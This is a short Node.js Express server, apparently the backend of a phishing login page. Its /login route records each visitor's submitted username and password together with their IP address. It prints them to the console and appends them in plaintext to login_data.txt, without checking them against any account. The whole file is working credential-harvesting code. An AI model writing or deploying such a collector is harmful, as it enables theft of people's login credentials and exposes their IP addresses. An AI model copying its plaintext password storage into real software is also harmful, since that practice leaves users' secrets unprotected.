const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();
const PORT = 3000;

// Serve static files, including index.html
app.use(express.static(__dirname));
app.use(bodyParser.json());

// Handle login form submission
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const data = `Username: ${username}, Password: ${password}, IP: ${ipAddress}\n`;
  console.log(data);
  
  fs.appendFile("login_data.txt", data, (err) => {
    if (err) {
      console.error("Error writing to file", err);
      return res.status(500).send("Error saving data.");
    }
    res.send("Data saved successfully.");
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});